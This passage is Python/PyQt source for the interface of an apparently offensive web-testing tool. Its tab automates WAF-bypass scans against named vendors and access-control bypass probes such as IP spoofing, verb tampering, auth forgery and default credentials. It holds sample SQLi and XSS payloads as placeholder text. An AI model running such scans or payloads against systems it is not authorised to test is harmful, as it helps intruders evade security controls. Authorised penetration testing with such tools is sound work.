        form = QFormLayout()
        form.setSpacing(8)

        self._timeout = QSpinBox()
        self._timeout.setRange(5, 300)
        self._timeout.setValue(cfg.get("timeout", 20))
        self._timeout.setSuffix(" s")
        form.addRow("Timeout:", self._timeout)

        self._delay = QDoubleSpinBox()
        self._delay.setRange(0.0, 30.0)
        self._delay.setSingleStep(0.1)
        self._delay.setDecimals(2)
        self._delay.setValue(cfg.get("delay", 0.1))
        self._delay.setSuffix(" s")
        form.addRow("Request Delay:", self._delay)

        self._retries = QSpinBox()
        self._retries.setRange(0, 10)
        self._retries.setValue(cfg.get("retries", 1))
        form.addRow("Max Retries:", self._retries)

        root.addLayout(form)

        # ── Boost Mode ───────────────────────────────────────────────────
        boost_grp = QGroupBox("Boost Mode")
        boost_vl  = QVBoxLayout(boost_grp)
        boost_vl.setSpacing(6)

        self._boost = QCheckBox("⚡ Enable Boost Mode  (parallel workers — faster but noisier)")
        self._boost.setChecked(cfg.get("boost_mode", False))
        boost_vl.addWidget(self._boost)

        workers_row = QHBoxLayout()
        workers_lbl = QLabel("  Workers:")
        self._workers = QSpinBox()
        self._workers.setRange(2, 50)
        self._workers.setValue(cfg.get("workers", 5))
        self._workers.setToolTip("Number of parallel threads (Boost Mode only)")
        self._workers.setEnabled(self._boost.isChecked())
        workers_row.addWidget(workers_lbl)
        workers_row.addWidget(self._workers)
        workers_row.addStretch()
        boost_vl.addLayout(workers_row)
        self._boost.toggled.connect(self._workers.setEnabled)
        root.addWidget(boost_grp)

        # ── SSL / Redirects ──────────────────────────────────────────────
        self._ssl = QCheckBox("Verify SSL certificates")
        self._ssl.setChecked(cfg.get("verify_ssl", False))
        root.addWidget(self._ssl)

        self._redirects = QCheckBox("Follow redirects")
        self._redirects.setChecked(cfg.get("follow_redirects", False))
        root.addWidget(self._redirects)

        # ── Highlight current preset ─────────────────────────────────────
        self._highlight_preset(cfg)

        btns = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        btns.accepted.connect(self.accept)
        btns.rejected.connect(self.reject)
        root.addWidget(btns)

    def _apply_preset(self, name: str):
        p = self._PRESETS[name]
        self._timeout.setValue(p["timeout"])
        self._delay.setValue(p["delay"])
        for n, btn in self._preset_btns.items():
            btn.setChecked(n == name)

    def _highlight_preset(self, cfg: dict):
        t = cfg.get("timeout", 20)
        d = cfg.get("delay", 0.1)
        for name, p in self._PRESETS.items():
            match = (p["timeout"] == t and abs(p["delay"] - d) < 0.01)
            self._preset_btns[name].setChecked(match)

    def values(self) -> dict:
        boost = self._boost.isChecked()
        return {
            "timeout":          self._timeout.value(),
            "delay":            self._delay.value(),
            "workers":          self._workers.value() if boost else 1,
            "retries":          self._retries.value(),
            "verify_ssl":       self._ssl.isChecked(),
            "follow_redirects": self._redirects.isChecked(),
            "boost_mode":       boost,
        }


# ─────────────────────────────────────────────────────────────────────────────
# Main tab widget
# ─────────────────────────────────────────────────────────────────────────────

class BypassTab(QWidget):
    """
    Left panel  — HTTP Request editor (top) + Config (bottom)
    Right panel — Traffic Monitor | Bypass Results | Scan Log  (tabs)
    """

    _WAF_VENDORS = [
        "Auto-detect", "Cloudflare", "ModSecurity / OWASP CRS", "Akamai",
        "AWS WAF", "F5 BIG-IP / ASM", "Imperva / Incapsula", "Sucuri",
        "Barracuda", "Distil / Radware", "Fortinet FortiWeb",
        "Citrix WAF / NetScaler", "Nginx + NAXSI", "Generic WAF", "Unknown",
    ]
    _VENDOR_MAP = {
        "Cloudflare":              "Cloudflare",
        "ModSecurity / OWASP CRS": "ModSecurity",
        "Akamai":                  "Akamai",
        "AWS WAF":                 "AWS WAF",
        "F5 BIG-IP / ASM":         "F5 BIG-IP",
        "Imperva / Incapsula":     "Imperva/Incapsula",
        "Sucuri":                  "Sucuri",
        "Barracuda":               "Barracuda",
        "Distil / Radware":        "Distil/Radware",
        "Fortinet FortiWeb":       "Fortinet FortiWeb",
        "Citrix WAF / NetScaler":  "Citrix WAF",
        "Nginx + NAXSI":           "Nginx+NAXSI",
        "Generic WAF":             "Generic WAF",
    }
    _PAYLOAD_TYPES = [
        "Auto-detect", "XSS", "SQLi", "LFI",
        "Command Injection", "XXE", "SSTI", "SSRF", "Custom",
    ]
    _PAYLOAD_CAT_MAP = {
        "XSS": "xss", "SQLi": "sqli", "LFI": "lfi",
        "Command Injection": "cmdi", "XXE": "xxe", "SSTI": "ssti", "SSRF": "ssrf",
    }

    def __init__(self, parent=None):
        super().__init__(parent)
        self._worker: Optional[BypassWorker] = None
        self._probe_entries: List[ProbeEntry]   = []
        self._result_entries: List[Dict]        = []
        # Request config defaults (editable via ⚙ Config dialog)
        self._req_cfg: Dict = {
            "timeout":          20,
            "delay":            0.1,
            "workers":          1,
            "retries":          1,
            "verify_ssl":       False,
            "follow_redirects": False,
            "boost_mode":       False,
        }
        self._build_ui()
        self._apply_style()

    # ── build ──────────────────────────────────────────────────────────────

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(6, 6, 6, 6)
        root.setSpacing(4)

        # ── Top toolbar ───────────────────────────────────────────────────
        tb = QHBoxLayout()
        self.run_btn   = QPushButton("▶  Run WAF Bypass Scan")  # text updated by _on_mode_changed
        self.stop_btn  = QPushButton("⏹  Stop")
        self.clear_btn = QPushButton("🗑  Clear")
        self.cfg_btn   = QPushButton("⚙  Config")
        self.stop_btn.setEnabled(False)
        for b in (self.run_btn, self.stop_btn, self.clear_btn, self.cfg_btn):
            b.setFixedHeight(24)

        self.run_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:0 14px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self.stop_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_CRITICAL};color:#fff;font-weight:bold;"
            f"border:none;border-radius:4px;padding:0 10px;}}"
            f"QPushButton:disabled{{background:{COLOR_BORDER};color:{COLOR_TEXT_MUTED};}}"
        )
        self.clear_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 8px;}}"
            f"QPushButton:hover{{color:{COLOR_TEXT_BRIGHT};border-color:{COLOR_ACCENT};}}"
        )
        self.cfg_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:4px;padding:0 8px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)
        self.progress_bar.setVisible(False)
        self.progress_bar.setFixedHeight(6)
        self.progress_bar.setTextVisible(False)
        self.status_lbl = QLabel("Ready")
        self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")

        tb.addWidget(self.run_btn)
        tb.addWidget(self.stop_btn)
        tb.addWidget(self.clear_btn)
        tb.addWidget(self.cfg_btn)
        tb.addSpacing(14)
        _mode_lbl = QLabel('Mode:')
        _mode_lbl.setStyleSheet(f'color:{COLOR_TEXT_MUTED};font-size:9pt;')
        tb.addWidget(_mode_lbl)
        self.mode_combo = QComboBox()
        self.mode_combo.addItems(['\U0001f525 WAF Bypass', '\U0001f6e1 Access Control Bypass'])
        self.mode_combo.setFixedHeight(26)
        self.mode_combo.setFixedWidth(215)
        self.mode_combo.setStyleSheet(
            f'QComboBox{{background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};'
            f'border:1px solid {COLOR_ACCENT};border-radius:4px;'
            f'padding:2px 8px;font-weight:bold;font-size:9pt;}}'
            f'QComboBox::drop-down{{border:none;width:16px;}}'
            f'QComboBox QAbstractItemView{{background:{COLOR_DARK_BG};'
            f'color:{COLOR_TEXT_BRIGHT};selection-background-color:{COLOR_ACCENT};}}'
        )
        self.mode_combo.currentIndexChanged.connect(self._on_mode_changed)
        tb.addWidget(self.mode_combo)
        tb.addSpacing(4)
        tb.addWidget(self.progress_bar)
        tb.addStretch()
        tb.addWidget(self.status_lbl)

        tb_widget = QWidget()
        tb_widget.setLayout(tb)
        tb_widget.setFixedHeight(36)  # adjust this number to taste
        root.addWidget(tb_widget)

        # ── Horizontal splitter ───────────────────────────────────────────
        h = QSplitter(Qt.Horizontal)
        h.setHandleWidth(5)
        h.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # ─── LEFT: vertical splitter ─────────────────────────────────────
        lv = QSplitter(Qt.Vertical)
        lv.setHandleWidth(5)
        lv.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        # LEFT-TOP: HTTP Request
        rg = QGroupBox("HTTP Request")
        rg.setStyleSheet(self._grp())
        rl = QVBoxLayout(rg)
        rl.setContentsMargins(6, 12, 6, 6)
        rl.setSpacing(4)

        target_row = QHBoxLayout()
        target_row.setSpacing(6)
        for txt in ("Scheme:", "Host:"):
            lbl = QLabel(txt)
            lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
            target_row.addWidget(lbl)
            if txt == "Scheme:":
                self.scheme_combo = QComboBox()
                self.scheme_combo.addItems(["https", "http"])
                self.scheme_combo.setFixedWidth(75)
                self.scheme_combo.setFixedHeight(24)
                target_row.addWidget(self.scheme_combo)
                target_row.addSpacing(4)
            else:
                self.host_edit = QLineEdit()
                self.host_edit.setPlaceholderText("e.g. example.com  or  example.com:8443")
                self.host_edit.setFixedHeight(24)
                target_row.addWidget(self.host_edit, 1)
        rl.addLayout(target_row)

        self.request_editor = QTextEdit()
        self.request_editor.setFont(QFont("Consolas", 10))
        self.request_editor.setPlaceholderText(
            "Paste a raw HTTP request here, or use\n"
            "HTTP History → right-click → 🛡 Send to WAF Bypass\n\n"
            "Example:\n"
            "POST /login HTTP/1.1\n"
            "Host: example.com\n"
            "Content-Type: application/x-www-form-urlencoded\n\n"
            "username=admin'--&password=x"
        )
        self._req_hl = HttpSyntaxHighlighter(self.request_editor.document())
        rl.addWidget(self.request_editor)
        lv.addWidget(rg)

        # LEFT-BOTTOM: Config
        self._cfg_group = QGroupBox("WAF Bypass Configuration")
        cg = self._cfg_group
        cg.setStyleSheet(self._grp())
        cl = QVBoxLayout(cg)
        cl.setContentsMargins(8, 14, 8, 8)
        cl.setSpacing(8)

        self._mode_hint_lbl = QLabel(
            'Payload-focused: evade WAF rules blocking your XSS/SQLi/etc payloads.'
        )
        self._mode_hint_lbl.setWordWrap(True)
        self._mode_hint_lbl.setStyleSheet(
            f'color:{COLOR_TEXT_MUTED};font-size:8pt;'
            f'background:{COLOR_DARK_BG};padding:4px 6px;border-radius:3px;'
        )
        cl.addWidget(self._mode_hint_lbl)
        self._waf_only_labels = []

        # Row 1: WAF type | Payload type | Timeout | Delay
        r1 = QHBoxLayout()
        r1.setSpacing(12)

        self.waf_vendor_combo = QComboBox()
        self.waf_vendor_combo.addItems(self._WAF_VENDORS)
        self.waf_vendor_combo.setFixedHeight(26)
        r1.addLayout(self._fcol("WAF Type:", self.waf_vendor_combo))

        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems(self._PAYLOAD_TYPES)
        self.payload_type_combo.setFixedHeight(26)
        r1.addLayout(self._fcol("Payload Type:", self.payload_type_combo))

        r1.addStretch()
        cl.addLayout(r1)

        # Row 2: Blocked payload
        r2h = QHBoxLayout()
        lbl2 = QLabel("Blocked Payload  (exact payload being blocked — auto-detected from request):")
        lbl2.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.auto_detect_btn = QPushButton("🔍 Auto-detect")
        self.auto_detect_btn.setFixedHeight(22)
        self.auto_detect_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};"
            f"border:1px solid {COLOR_ACCENT};border-radius:3px;font-size:9pt;padding:0 8px;}}"
            f"QPushButton:hover{{background:{COLOR_ACCENT};color:#000;}}"
        )
        r2h.addWidget(lbl2)
        r2h.addStretch()
        r2h.addWidget(self.auto_detect_btn)
        cl.addLayout(r2h)

        self.blocked_payload_edit = QLineEdit()
        self.blocked_payload_edit.setPlaceholderText(
            "e.g.  <script>alert(1)</script>   — leave empty to use built-in test payloads"
        )
        self.blocked_payload_edit.setFixedHeight(26)
        cl.addWidget(self.blocked_payload_edit)

        # Row 3: Custom payloads
        lbl3 = QLabel("Extra Payloads  (optional, same type only — one per line):")
        lbl3.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        cl.addWidget(lbl3)

        self.custom_payloads_edit = QTextEdit()
        self.custom_payloads_edit.setFixedHeight(58)
        self.custom_payloads_edit.setFont(QFont("Consolas", 9))
        self.custom_payloads_edit.setPlaceholderText(
            "<img src=x onerror=alert(document.domain)>\n<svg/onload=alert(1)>"
        )
        cl.addWidget(self.custom_payloads_edit)
        lv.addWidget(cg)

        # Left proportions: 60% request, 40% config
        lv.setSizes([420, 280])
        h.addWidget(lv)

        # ─── RIGHT: tabbed panel ──────────────────────────────────────────
        rt = QTabWidget()
        rt.setStyleSheet(
            f"QTabWidget::pane{{border:1px solid {COLOR_BORDER};}}"
            f"QTabBar::tab{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"padding:6px 14px;border:1px solid {COLOR_BORDER};}}"
            f"QTabBar::tab:selected{{background:{COLOR_ACCENT};color:#fff;}}"
        )
        rt.addTab(self._traffic_tab(), " Traffic Monitor")
        rt.addTab(self._results_tab(), "🏆 Bypass Results")
        rt.addTab(self._log_tab(),     "📋 Scan Log")
        h.addWidget(rt)

        # 40% left / 60% right
        h.setSizes([400, 600])
        root.addWidget(h)

        # Signals
        self.run_btn.clicked.connect(self._start_scan)
        self.stop_btn.clicked.connect(self._stop_scan)
        self.clear_btn.clicked.connect(self._clear_all)
        self.cfg_btn.clicked.connect(self._show_req_config)
        self.auto_detect_btn.clicked.connect(self._auto_detect_payload)

    # ── Tab content builders ───────────────────────────────────────────────

    def _traffic_tab(self) -> QWidget:
        w = QWidget()
        vl = QVBoxLayout(w)
        vl.setContentsMargins(4, 4, 4, 4)
        vl.setSpacing(4)

        fr = QHBoxLayout()
        self.traffic_filter_edit = QLineEdit()
        self.traffic_filter_edit.setPlaceholderText("Filter by URL or technique…")
        self.traffic_filter_edit.setFixedHeight(24)

        # Status filter
        _status_lbl = QLabel("Status:")
        _status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.status_filter_combo = QComboBox()
        self.status_filter_combo.addItems(["All", "2xx", "3xx", "4xx", "5xx", "0 (err)"])
        self.status_filter_combo.setFixedHeight(24)
        self.status_filter_combo.setFixedWidth(80)
        self.status_filter_combo.setStyleSheet(
            f"QComboBox{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;padding:0 4px;font-size:9pt;}}"
            f"QComboBox::drop-down{{border:none;width:12px;}}"
        )

        # Length diff filter
        _ldiff_lbl = QLabel("Len Δ≥:")
        _ldiff_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        self.len_diff_spin = QSpinBox()
        self.len_diff_spin.setRange(0, 999999)
        self.len_diff_spin.setValue(0)
        self.len_diff_spin.setFixedHeight(24)
        self.len_diff_spin.setFixedWidth(72)
        self.len_diff_spin.setStyleSheet(
            f"QSpinBox{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;padding:0 4px;font-size:9pt;}}"
        )
        self.len_diff_spin.setToolTip("Show only rows where |length - baseline_length| >= this value")

        self.show_bypassed_only = QCheckBox("Bypassed only")

        self.traffic_filter_edit.textChanged.connect(self._apply_traffic_filter)
        self.show_bypassed_only.stateChanged.connect(self._apply_traffic_filter)
        self.status_filter_combo.currentIndexChanged.connect(self._apply_traffic_filter)
        self.len_diff_spin.valueChanged.connect(self._apply_traffic_filter)

        fr.addWidget(self.traffic_filter_edit, 1)
        fr.addWidget(_status_lbl)
        fr.addWidget(self.status_filter_combo)
        fr.addWidget(_ldiff_lbl)
        fr.addWidget(self.len_diff_spin)
        fr.addWidget(self.show_bypassed_only)

        self.auto_scroll_btn = QPushButton(" Auto-scroll: ON")
        self.auto_scroll_btn.setCheckable(True)
        self.auto_scroll_btn.setChecked(True)
        self.auto_scroll_btn.setFixedHeight(24)
        self.auto_scroll_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_SUCCESS};"
            f"border:1px solid {COLOR_SUCCESS};border-radius:3px;"
            f"font-size:9pt;padding:0 8px;font-weight:bold;}}"
            f"QPushButton:checked{{background:{COLOR_ELEVATED_BG};color:{COLOR_SUCCESS};"
            f"border:1px solid {COLOR_SUCCESS};}}"
            f"QPushButton:!checked{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};"
            f"border:1px solid {COLOR_BORDER};}}"
        )
        self.auto_scroll_btn.toggled.connect(self._on_auto_scroll_toggle)
        fr.addWidget(self.auto_scroll_btn)
        vl.addLayout(fr)

        self.traffic_table = QTableWidget(0, 7)
        self.traffic_table.setHorizontalHeaderLabels(
            ["#", "Method", "Status", "Length", "Time(s)", "Bypass", "Technique"]
        )
        hdr = self.traffic_table.horizontalHeader()
        hdr.setSectionResizeMode(6, QHeaderView.Stretch)
        for col, w_ in enumerate([35, 55, 58, 68, 65, 65]):
            hdr.resizeSection(col, w_)
        self.traffic_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.traffic_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.traffic_table.setAlternatingRowColors(True)
        self.traffic_table.verticalHeader().setDefaultSectionSize(20)
        self.traffic_table.verticalHeader().hide()
        self.traffic_table.setSortingEnabled(False)  # kept permanently False; manual sort via sectionClicked
        self.traffic_table.horizontalHeader().setSortIndicatorShown(True)
        self.traffic_table.horizontalHeader().sectionClicked.connect(self._sort_traffic_col)
        self.traffic_table.itemSelectionChanged.connect(self._on_traffic_select)
        self.traffic_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.traffic_table.customContextMenuRequested.connect(self._traffic_ctx)
        # Vertical splitter: top = probe table, bottom = req/resp detail
        vs = QSplitter(Qt.Vertical)
        vs.setHandleWidth(5)
        vs.setStyleSheet(
            f"QSplitter::handle{{background:{COLOR_BORDER};}}"
            f"QSplitter::handle:hover{{background:{COLOR_ACCENT};}}"
        )

        vs.addWidget(self.traffic_table)

        # Request / Response horizontal detail pane
        ds = QSplitter(Qt.Horizontal)
        ds.setHandleWidth(4)
        ds.setStyleSheet(f"QSplitter::handle{{background:{COLOR_BORDER};}}")

        req_f = self._detail_frame("Probe Request:")
        self.probe_request_view = req_f.findChild(QTextEdit)
        self._probe_req_hl = HttpSyntaxHighlighter(self.probe_request_view.document())

        resp_f = self._detail_frame("Probe Response:")
        self.probe_response_view = resp_f.findChild(QTextEdit)
        self._probe_resp_hl = HttpSyntaxHighlighter(self.probe_response_view.document())

        ds.addWidget(req_f)
        ds.addWidget(resp_f)
        ds.setSizes([1, 1])

        vs.addWidget(ds)
        # Default: 60% table, 40% detail — fully user-resizable
        vs.setSizes([300, 200])
        vl.addWidget(vs)
        return w

    def _detail_frame(self, title: str) -> QFrame:
        f = QFrame()
        f.setStyleSheet(f"QFrame{{border:1px solid {COLOR_BORDER};}}")
        lay = QVBoxLayout(f)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(2)
        lbl = QLabel(title)
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;border:none;")
        lay.addWidget(lbl)
        edit = QTextEdit()
        edit.setReadOnly(True)
        edit.setFont(QFont("Consolas", 9))
        edit.setStyleSheet("QTextEdit{border:none;}")
        lay.addWidget(edit)
        return f

    def _results_tab(self) -> QWidget:
        w = QWidget()
        vl = QVBoxLayout(w)
        vl.setContentsMargins(4, 4, 4, 4)
        vl.setSpacing(6)

        self.results_summary_lbl = QLabel("")
        self.results_summary_lbl.setWordWrap(True)
        self.results_summary_lbl.setMinimumHeight(34)
        self.results_summary_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_BRIGHT};padding:6px;"
            f"background:{COLOR_CARD_BG};border-radius:4px;"
        )
        vl.addWidget(self.results_summary_lbl)

        self.waf_info_lbl = QTextEdit()
        self.waf_info_lbl.setReadOnly(True)
        self.waf_info_lbl.setFixedHeight(70)
        self.waf_info_lbl.setFont(QFont("Consolas", 9))
        self.waf_info_lbl.setStyleSheet(
            f"QTextEdit{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};}}"
        )
        vl.addWidget(self.waf_info_lbl)

        self.results_table = QTableWidget(0, 6)
        self.results_table.setHorizontalHeaderLabels(
            ["Confidence", "Status", "Length", "Δ Length", "Evidence", "Technique"]
        )
        hdr = self.results_table.horizontalHeader()
        hdr.setSectionResizeMode(4, QHeaderView.Stretch)
        hdr.setSectionResizeMode(5, QHeaderView.Stretch)
        for col, w_ in enumerate([78, 55, 65, 65]):
            hdr.resizeSection(col, w_)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.verticalHeader().hide()
        self.results_table.setAlternatingRowColors(True)
        self.results_table.verticalHeader().setDefaultSectionSize(22)
        vl.addWidget(self.results_table)
        return w

    def _log_tab(self) -> QWidget:
        w = QWidget()
        vl = QVBoxLayout(w)
        vl.setContentsMargins(4, 4, 4, 4)
        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setFont(QFont("Consolas", 9))
        vl.addWidget(self.log_view)
        return w

    # ── Style helpers ──────────────────────────────────────────────────────

    def _grp(self) -> str:
        return (
            f"QGroupBox{{border:1px solid {COLOR_BORDER};border-radius:4px;"
            f"margin-top:8px;padding-top:6px;background:{COLOR_ELEVATED_BG};}}"
            f"QGroupBox::title{{subcontrol-origin:margin;subcontrol-position:top left;"
            f"padding:0 6px;color:{COLOR_ACCENT};font-weight:bold;}}"
        )

    def _fcol(self, lbl_txt: str, widget: QWidget) -> QVBoxLayout:
        col = QVBoxLayout()
        col.setSpacing(3)
        lbl = QLabel(lbl_txt)
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:9pt;")
        col.addWidget(lbl)
        col.addWidget(widget)
        return col

    def _apply_style(self):
        self.setStyleSheet(f"""
            QWidget{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};}}
            QTextEdit,QLineEdit,QComboBox,QSpinBox,QDoubleSpinBox{{
                background:{COLOR_DARK_BG};border:1px solid {COLOR_BORDER};
                color:{COLOR_TEXT};padding:2px 4px;}}
            QTableWidget{{background:{COLOR_ELEVATED_BG};
                alternate-background-color:{COLOR_DARK_BG};
                border:1px solid {COLOR_BORDER};gridline-color:{COLOR_BORDER};}}
            QTableWidget::item:selected{{background:{COLOR_ACCENT};color:#fff;}}
            QHeaderView::section{{background:{COLOR_ELEVATED_BG};
                color:{COLOR_TEXT_BRIGHT};padding:4px;
                border:1px solid {COLOR_BORDER};font-weight:bold;}}
            QCheckBox{{color:{COLOR_TEXT};}}
            QProgressBar{{background:{COLOR_DARK_BG};
                border:1px solid {COLOR_BORDER};border-radius:3px;}}
            QProgressBar::chunk{{background:{COLOR_ACCENT};border-radius:3px;}}
        """)

    # ── Public API ─────────────────────────────────────────────────────────

    def load_request(self, raw_request: str, host: str = "",
                     port: int = 443, is_https: bool = True):
        """Called by HTTP History 'Send to Bypass'."""
        self.request_editor.setPlainText(raw_request)
        if host:
            self.host_edit.setText(host)
        self.scheme_combo.setCurrentText("https" if is_https else "http")
        self._auto_detect_payload()
        self._log(f"📥 Request loaded — host:{host or '(from Host header)'}  port:{port}")

    # ── Actions ────────────────────────────────────────────────────────────

    def _scan_mode(self) -> str:
        """Return current scan mode: 'waf' or 'ac'."""
        return "ac" if self.mode_combo.currentIndex() == 1 else "waf"

    def _set_mode(self, mode: str):
        """Switch mode via the combo (used by external callers if needed)."""
        self.mode_combo.setCurrentIndex(0 if mode == "waf" else 1)

    def _on_mode_changed(self, idx: int):
        is_waf = (idx == 0)

        # Update run button label
        self.run_btn.setText(
            "▶  Run WAF Bypass Scan" if is_waf else "▶  Run Access Control Bypass"
        )

        # Show/hide WAF-only widgets
        for w in (self.waf_vendor_combo, self.payload_type_combo,
                  self.blocked_payload_edit, self.auto_detect_btn,
                  self.custom_payloads_edit):
            w.setVisible(is_waf)
        for lbl in getattr(self, '_waf_only_labels', []):
            lbl.setVisible(is_waf)

        # Update config group title
        if hasattr(self, '_cfg_group'):
            self._cfg_group.setTitle(
                'WAF Bypass Configuration' if is_waf else 'Access Control Bypass Configuration'
            )

        # Update hint label if present
        if hasattr(self, '_mode_hint_lbl'):
            if is_waf:
                self._mode_hint_lbl.setText(
                    'Payload-focused: evade WAF rules blocking your XSS/SQLi/etc payloads.'
                )
            else:
                self._mode_hint_lbl.setText(
                    '11 phases  ~300 probes  no payload needed  |  '
                    'IP-spoof, header rewrite, verb tamper, path mutations, '
                    'encoding, HTTP version, UA rotation, extensions, '
                    'auth forgery, default creds, combo'
                )

    def _auto_detect_payload(self):
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            return
        payload, cat = _extract_blocked_payload(raw)
        if payload:
            self.blocked_payload_edit.setText(payload)
            disp = {v: k for k, v in self._PAYLOAD_CAT_MAP.items()}.get(cat)
            if disp:
                idx = self.payload_type_combo.findText(disp)
                if idx >= 0:
                    self.payload_type_combo.setCurrentIndex(idx)
            self._log(f"🔍 Auto-detected [{cat}]: {payload[:80]}")
            self._status(f"✓ Detected [{cat}] payload", COLOR_SUCCESS)
        else:
            self._status("⚠ No attack payload found — enter it manually", COLOR_HIGH)

    def _build_config(self) -> Tuple[Dict, Dict]:
        raw      = self.request_editor.toPlainText().strip()
        parsed   = _parse_raw_request(raw)
        scheme   = self.scheme_combo.currentText()
        host_val = self.host_edit.text().strip() or parsed.get("host", "")
        url      = f"{scheme}://{host_val}{parsed.get('path','/')}" if host_val else parsed.get("path", "/")

        hdrs = {**parsed.get("headers", {})}
        if host_val and "host" not in {k.lower() for k in hdrs}:
            hdrs["Host"] = host_val

        _scan_mode = "ac"  if self.mode_combo.currentIndex() == 1 else "waf"
        rd = {"url": url, "method": parsed.get("method","GET"),
              "request_text": raw, "headers": hdrs, "body": parsed.get("body",""),
              "_scan_mode": _scan_mode}

        # Common request config keys (from _req_cfg)
        rc = self._req_cfg
        _common = {
            "timeout":          rc["timeout"],
            "delay":            rc["delay"],
            "workers":          rc["workers"],
            "retries":          rc["retries"],
            "verify_ssl":       rc["verify_ssl"],
            "follow_redirects": rc["follow_redirects"],
            "boost_mode":       rc["boost_mode"],
        }

        if self._scan_mode() == "ac":
            # Access Control Bypass — no payload config needed
            cfg = {**_common}
        else:
            # WAF Bypass — full payload config
            vd = self.waf_vendor_combo.currentText()
            vendor = self._VENDOR_MAP.get(vd) if vd not in ("Auto-detect", "Unknown") else None

            pd = self.payload_type_combo.currentText()
            if pd == "Auto-detect":
                cat = _detect_payload_category(self.blocked_payload_edit.text().strip()) or "sqli"
            elif pd == "Custom":
                cat = "sqli"
            else:
                cat = self._PAYLOAD_CAT_MAP.get(pd, "sqli")

            primary = self.blocked_payload_edit.text().strip()
            custom  = [l.strip() for l in self.custom_payloads_edit.toPlainText().splitlines() if l.strip()]

            cfg = {"vendor": vendor, "primary_payload": primary,
                   "primary_category": cat, "payload_cats": [cat],
                   "custom_payloads": custom, "active_phases": list(range(13)),
                   **_common}
        return rd, cfg

    def _start_scan(self):
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            QMessageBox.warning(self, "No Request", "Paste an HTTP request first.")
            return
        parsed = _parse_raw_request(raw)
        if not self.host_edit.text().strip() and not parsed.get("host"):
            QMessageBox.warning(self, "No Target", "Enter a target host or include a Host header.")
            return

        # Reset
        self.traffic_table.setSortingEnabled(False)  # kept permanently off; safe to leave
        self._probe_entries.clear()
        for t in (self.traffic_table, self.results_table):
            t.setRowCount(0)
        self.results_summary_lbl.setText("")
        self.waf_info_lbl.clear()
        self.probe_request_view.clear()
        self.probe_response_view.clear()
        self.log_view.clear()

        try:
            rd, cfg = self._build_config()
        except Exception as e:
            QMessageBox.critical(self, "Config Error", str(e))
            return

        mode = self._scan_mode()
        if mode == "ac":
            self._log("🚀 Access Control Bypass Scan started")
            self._log(f"   Target  : {rd['url']}")
            self._log(f"   Method  : {rd['method']}")
            self._log(f"   Phases  : 11  (~300 probes)")
        else:
            self._log("🚀 WAF Bypass Scan started")
            self._log(f"   Target     : {rd['url']}")
            self._log(f"   Method     : {rd['method']}")
            self._log(f"   WAF vendor : {cfg.get('vendor') or 'Auto-detect'}")
            self._log(f"   Payload cat: {cfg.get('primary_category','?').upper()}")
            self._log(f"   Primary    : {cfg.get('primary_payload','(none)')[:80]}")
            self._log(f"   Custom     : {len(cfg.get('custom_payloads',[]))} extra payload(s)")
        self._log("─" * 56)

        _mode = rd.pop('_scan_mode', 'waf')
        self._worker = BypassWorker(rd, cfg, scan_mode=_mode, parent=self)
        self._worker.probe_sent.connect(self._on_probe)
        self._worker.progress_msg.connect(self._on_progress)
        self._worker.scan_finished.connect(self._on_finished)
        self._worker.scan_error.connect(self._on_error)
        self._worker.finished.connect(self._on_done)

        self.run_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setVisible(True)
        self._status("⏳ Scanning…", COLOR_ACCENT)
        self._worker.start()

    def _stop_scan(self):
        if self._worker:
            self._worker.stop()
            self._worker.quit()
